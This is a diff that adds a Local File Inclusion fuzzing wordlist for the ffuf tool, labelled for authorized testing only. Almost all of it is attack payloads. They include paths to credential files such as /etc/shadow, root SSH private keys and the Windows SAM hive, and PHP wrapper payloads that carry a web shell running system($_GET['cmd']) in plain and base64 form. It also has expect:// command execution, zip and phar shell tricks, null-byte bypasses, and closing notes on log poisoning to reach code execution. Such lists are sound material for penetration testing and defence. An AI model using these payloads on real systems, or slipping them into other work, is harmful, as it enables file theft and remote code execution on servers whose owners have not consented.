@@ -1,0 +1,141 @@
+# ============================================================
+# LFI (Local File Inclusion) Fuzzing Wordlist
+# Usage: ffuf -u http://example.com/page.php?file=FUZZ -w this_file.txt
+# For authorized security testing only.
+# ============================================================
+
+# ---------------------------------------
+# SECTION 1: Linux common sensitive files
+# ---------------------------------------
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/hostname
+/etc/issue
+/etc/motd
+/etc/crontab
+/etc/fstab
+/etc/mysql/my.cnf
+/etc/ssh/sshd_config
+/etc/ssh/ssh_config
+/etc/apache2/apache2.conf
+/etc/apache2/sites-enabled/000-default.conf
+/etc/nginx/nginx.conf
+/etc/nginx/sites-enabled/default
+/etc/httpd/conf/httpd.conf
+/etc/resolv.conf
+/etc/environment
+/etc/profile
+/etc/bash.bashrc
+/etc/php/7.4/apache2/php.ini
+/etc/php.ini
+/etc/network/interfaces
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/status
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+/proc/version
+/proc/cpuinfo
+/proc/net/tcp
+/proc/net/fib_trie
+/root/.bash_history
+/root/.ssh/id_rsa
+/root/.ssh/authorized_keys
+/home/user/.bash_history
+/home/user/.ssh/id_rsa
+/var/log/auth.log
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/syslog
+/var/www/html/config.php
+/var/www/html/wp-config.php
+/var/mail/root
+/var/spool/cron/crontabs/root
+
+# ---------------------------------------
+# SECTION 2: Windows common sensitive files
+# ---------------------------------------
+C:\Windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SYSTEM
+C:\Windows\repair\SAM
+C:\Windows\debug\NetSetup.log
+C:\Windows\system32\inetsrv\config\applicationHost.config
+C:\Windows\php.ini
+C:\Windows\my.ini
+C:\inetpub\logs\LogFiles
+C:\inetpub\wwwroot\web.config
+C:\xampp\apache\conf\httpd.conf
+C:\xampp\php\php.ini
+C:\Program Files\MySQL\my.ini
+C:\boot.ini
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattended.xml
+
+# ---------------------------------------
+# SECTION 3: PHP wrapper based LFI-to-RCE / disclosure payloads
+# ---------------------------------------
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config.php
+php://filter/read=convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
+php://filter/zlib.deflate/convert.base64-encode/resource=index.php
+php://filter/convert.iconv.utf-8.utf-16/resource=index.php
+php://input
+php://stdin
+php://fd/0
+php://memory
+php://temp
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+data://text/plain,<?php system($_GET['cmd']); ?>
+expect://id
+zip://shell.jpg%23payload.php
+phar://shell.jpg/test.php
+
+# ---------------------------------------
+# SECTION 4: Log poisoning targets (combine with injected payload in UA/Referer)
+# ---------------------------------------
+/var/log/apache2/access.log
+/var/log/apache/access.log
+/var/log/nginx/access.log
+/var/log/httpd/access_log
+/var/log/vsftpd.log
+/var/log/mail.log
+/var/log/proftpd/proftpd.log
+/var/log/apache2/error.log
+
+# ---------------------------------------
+# SECTION 5: NULL byte / truncation bypass (older PHP <5.3.4)
+# ---------------------------------------
+/etc/passwd%00
+/etc/passwd%00.jpg
+/etc/passwd%00.png
+../../../../etc/passwd%00
+....//....//....//etc/passwd
+
+# ---------------------------------------
+# SECTION 6: Wrapper filter chains for RCE (php-filter-chain-generator style)
+# ---------------------------------------
+php://filter/convert.base64-decode/resource=php://filter/convert.base64-encode/resource=index.php
+php://filter/string.strip_tags/resource=index.php
+php://filter/convert.quoted-printable-encode/resource=index.php
+
+# ---------------------------------------
+# NOTES
+# ---------------------------------------
+# - Combine these paths with Path Traversal prefixes from the
+#   path_traversal_wordlist.txt (e.g. ../../../../) since many apps
+#   need the traversal sequence AND the target file in one payload.
+# - PHP wrappers (php://, data://, expect://, zip://, phar://) only
+#   work if allow_url_include / register globals or specific PHP
+#   extensions are configured — test their presence first.
+# - Log poisoning requires write access to a log the app includes;
+#   inject <?php system($_GET['cmd']);?> via User-Agent/Referer first,
+#   then request this log file via the LFI parameter.
+# - Only use against systems you are explicitly authorized to test.
